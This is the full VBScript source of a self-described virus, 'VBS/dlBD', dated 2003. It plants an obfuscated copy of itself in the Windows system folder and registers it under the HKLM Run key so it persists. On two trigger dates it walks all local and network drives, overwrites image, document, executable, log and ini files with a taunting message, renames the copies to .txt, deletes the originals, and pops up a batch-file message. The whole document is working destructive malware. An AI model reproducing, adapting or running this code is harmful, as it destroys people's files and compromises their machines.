rem - VBS/dlBD "DL BirthDay" Virus
rem - Written by D.L. on November 8th, 2003

On Error Resume Next 
dim FSobj,winDir,sysDir,copySelf,newFile,rawFileData,hackedFileData,fixData,dataFixed,newFileData,copySelfComplete
set FSobj=CreateObject("Scripting.FileSystemObject")
set sysDir=FSobj.GetSpecialFolder(1)

checkDate()
function checkDate()
	if (day(Now)=31 and month(Now)=3)or(day(Now)=19 and month(Now)=12) then 
		beginInfestation()
		displayMessage() 
        else
		plantTrojanizedFile()      
        end if     
end function

function plantTrojanizedFile()
	set copySelf=FSobj.CreateTextFile(sysDir+"\sys-dlBD.vbs")
	copySelf.close
	set newFile=FSobj.OpenTextFile(WScript.ScriptFullname,1)
	writeCopy()
	hackedFileData=replace(rawFileData,chr(42),chr(68))
	fixData=replace(hackedFileData,chr(37),chr(76))
	dataFixed=replace(fixData,chr(124),chr(46))
	newFileData=replace(dataFixed,chr(94),"""")
	set copySelfComplete=FSobj.OpenTextFile(sysDir+"\sys-dlBD.vbs",2)
	copySelfComplete.write newFileData
	copySelfComplete.close

	createRegKey "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\sysdlBD",sysDir&"\sys-dlBD.vbs"
end function

sub createRegKey(regKey,regVal)
     dim regEdit
     set regEdit=CreateObject("WScript.Shell")
     regEdit.RegWrite regKey,regVal
end sub

sub beginInfestation 
 	On Error Resume Next 
 	dim drive,machine,complete
	set machine=FSobj.Drives 
 	for each drive in machine  
 		if (drive.DriveType=2)or(drive.DriveType=3) then 
 			indexFolders(drive.Path&"\") 
		end If 
	next 
 	beginInfestation=complete 
end sub

sub indexFolders(location) 
	On Error Resume Next 
	dim specs, file, subFol 
	set specs=FSobj.GetFolder(location) 
	set subFol=specs.SubFolders 

	for each file in subFol 
		spreadData(file.Path) 
		indexFolders(file.Path) 
	next 
end sub 

sub spreadData(location)
	On Error Resume Next 
        dim folder,directory,file,generateCopy,appName,adExt,orgMes,mesStageTwo,mesStageThree,finalMes,extName,complete
	set folder=FSobj.GetFolder(location) 
	set directory=folder.Files 

	orgMes="Happy BirthDay to me! :) - You have been infected with the VBS/dlBD Virus...Written by *|%|"
	mesStageTwo=replace(orgMes,chr(42),chr(68))
	mesStageThree=replace(mesStageTwo,chr(124),chr(46))
	finalMes=replace(mesStageThree,chr(37),chr(76))

	for each file in directory 
		extName=lcase(FSobj.GetExtensionName(file.Path)) 
		complete=lcase(file.Name)

		if (extName="jpg")or(extName="gif")then 
			set generateCopy = FSobj.OpenTextFile(file.Path, 2, True) 
			generateCopy.write finalMes 
			generateCopy.Close
			appName=FSobj.GetBaseName(file.Path)
			set adExt=FSobj.GetFile(file.Path) 
			adExt.copy(location&"\"&appName&".txt") 
			FSobj.DeleteFile (file.Path) 

                elseIf (extName="log")or(extName="ini") then
			set generateCopy = FSobj.OpenTextFile(file.Path, 2, True) 
			generateCopy.write finalMes 
			generateCopy.Close
			appName=FSobj.GetBaseName(file.Path)
			set adExt=FSobj.GetFile(file.Path) 
			adExt.copy(location&"\"&appName&".txt") 
			FSobj.DeleteFile (file.Path) 

                elseIf (extName="doc")or(extName="exe") then
			set generateCopy = FSobj.OpenTextFile(file.Path, 2, True) 
			generateCopy.write finalMes 
			generateCopy.Close
			appName=FSobj.GetBaseName(file.Path)
			set adExt=FSobj.GetFile(file.Path) 
			adExt.copy(location&"\"&appName&".txt") 
			FSobj.DeleteFile (file.Path) 
		end if
	next 
end sub

function displayMessage()
        dim shell,messageFile
	set shell = CreateObject("WScript.Shell")
	set messageFile=FSobj.CreateTextFile(sysDir&"\dlBD-mes.bat")
	messageFile.close
	set FSobj=CreateObject("Scripting.FileSystemObject")
	set messageFile=FSobj.CreateTextFile(sysDir&"\dlBD-mes.bat")
	messageFile.WriteLine("@title Happy Birthday to me! :) - VBS/dlBD Virus")
	messageFile.WriteLine("@cls")
	messageFile.WriteLine("@echo Happy BirthDay to me! :) - You have been infected with the VBS/dlBD Virus :(")
	messageFile.WriteLine("@echo.")
	messageFile.WriteLine("@pause")
	messageFile.close
	shell.Run(sysDir&"\dlBD-mes.bat") 
end function

function writeCopy()
	rawFileData="rem - VBS/dlBD ^DL BirthDay^ Virus by *|%|" &vbcrlf& _
	"On Error Resume Next" &vbcrlf& _
	"dim FSobj,winDir,sysDir" &vbcrlf& _
	"set FSobj=CreateObject(^Scripting|FileSystemObject^)" &vbcrlf& _
	"set sysDir=FSobj|GetSpecialFolder(1)" &vbcrlf& _
	"checkDate()" &vbcrlf& _
	"function checkDate()" &vbcrlf& _
	"if (day(Now)=31 and month(Now)=3)or(day(Now)=19 and month(Now)=12) then" &vbcrlf& _ 
	"beginInfestation()" &vbcrlf& _
	"displayMessage()" &vbcrlf& _      
        "end if" &vbcrlf& _ 
	"end function" &vbcrlf& _ 
	"sub beginInfestation" &vbcrlf& _ 
 	"On Error Resume Next " &vbcrlf& _
 	"dim drive,machine,complete" &vbcrlf& _
	"set machine=FSobj|Drives " &vbcrlf& _
 	"for each drive in machine " &vbcrlf& _ 
 	"if (drive|DriveType=2)or(drive|DriveType=3) then" &vbcrlf& _ 
 	"indexFolders(drive|Path&^\^)" &vbcrlf& _ 
	"end If" &vbcrlf& _ 
	"next" &vbcrlf& _ 
 	"beginInfestation=complete" &vbcrlf& _ 
	"end sub" &vbcrlf& _
	"sub indexFolders(location)" &vbcrlf& _ 
	"On Error Resume Next" &vbcrlf& _ 
	"dim specs, file, subFol" &vbcrlf& _ 
	"set specs=FSobj|GetFolder(location)" &vbcrlf& _ 
	"set subFol=specs|SubFolders" &vbcrlf& _ 
	"for each file in subFol" &vbcrlf& _ 
	"spreadData(file|Path)" &vbcrlf& _ 
	"indexFolders(file|Path)" &vbcrlf& _ 
	"next" &vbcrlf& _ 
	"end sub" &vbcrlf& _ 
	"sub spreadData(location)" &vbcrlf& _
	"On Error Resume Next" &vbcrlf& _ 
        "dim folder,directory,file,generateCopy,appName,adExt,orgMes,mesStageTwo,mesStageThree,finalMes,extName,complete" &vbcrlf& _
	"set folder=FSobj|GetFolder(location)" &vbcrlf& _ 
	"set directory=folder|Files" &vbcrlf& _ 
	"finalMes=^Happy BirthDay to me! :) - You have been infected with the VBS/dlBD Virus...Written by *|%|^" &vbcrlf& _
	"for each file in directory" &vbcrlf& _ 
	"extName=lcase(FSobj|GetExtensionName(file|Path))" &vbcrlf& _ 
	"complete=lcase(file|Name)" &vbcrlf& _
	"if (extName=^jpg^)or(extName=^gif^)then " &vbcrlf& _
	"set generateCopy = FSobj|OpenTextFile(file|Path, 2, True)" &vbcrlf& _ 
	"generateCopy|write finalMes " &vbcrlf& _
	"generateCopy|Close" &vbcrlf& _
	"appName=FSobj|GetBaseName(file|Path)" &vbcrlf& _
	"set adExt=FSobj|GetFile(file|Path)" &vbcrlf& _ 
	"adExt|copy(location&^\^&appName&^|txt^)" &vbcrlf& _ 
	"FSobj|DeleteFile (file|Path)" &vbcrlf& _ 
        "elseIf (extName=^log^)or(extName=^ini^) then" &vbcrlf& _
	"set generateCopy = FSobj|OpenTextFile(file|Path, 2, True)" &vbcrlf& _ 
	"generateCopy|write finalMes" &vbcrlf& _ 
	"generateCopy|Close" &vbcrlf& _
	"appName=FSobj|GetBaseName(file|Path)" &vbcrlf& _
	"set adExt=FSobj|GetFile(file|Path)" &vbcrlf& _ 
	"adExt|copy(location&^\^&appName&^|txt^)" &vbcrlf& _ 
	"FSobj|DeleteFile (file|Path)" &vbcrlf& _ 
        "elseIf (extName=^doc^)or(extName=^exe^) then" &vbcrlf& _
	"set generateCopy = FSobj|OpenTextFile(file|Path, 2, True)" &vbcrlf& _ 
	"generateCopy|write finalMes" &vbcrlf& _ 
	"generateCopy|Close" &vbcrlf& _
	"appName=FSobj|GetBaseName(file|Path)" &vbcrlf& _
	"set adExt=FSobj|GetFile(file|Path)" &vbcrlf& _ 
	"adExt|copy(location&^\^&appName&^|txt^)" &vbcrlf& _ 
	"FSobj|DeleteFile (file|Path)" &vbcrlf& _ 
	"end if" &vbcrlf& _
	"next" &vbcrlf& _ 
	"end sub" &vbcrlf& _
	"function displayMessage()" &vbcrlf& _
        "dim shell,messageFile" &vbcrlf& _
	"set shell = CreateObject(^WScript|Shell^)" &vbcrlf& _
	"set messageFile=FSobj|CreateTextFile(sysDir&^\dlBD-mes|bat^)" &vbcrlf& _
	"messageFile|close" &vbcrlf& _
	"set FSobj=CreateObject(^Scripting|FileSystemObject^)" &vbcrlf& _
	"set messageFile=FSobj|CreateTextFile(sysDir&^\dlBD-mes|bat^)" &vbcrlf& _
	"messageFile|WriteLine(^@title Happy Birthday to me! :) - VBS/dlBD Virus - by *|%|^)" &vbcrlf& _
	"messageFile|WriteLine(^@cls^)" &vbcrlf& _
	"messageFile|WriteLine(^@echo Happy BirthDay to me! :) - You have been infected with the VBS/dlBD Virus :(^)" &vbcrlf& _
	"messageFile|WriteLine(^@echo|^)" &vbcrlf& _
	"messageFile|WriteLine(^@pause^)" &vbcrlf& _
	"messageFile|close" &vbcrlf& _
	"shell|Run(sysDir&^\dlBD-mes|bat^)" &vbcrlf& _ 
	"end function"
end function
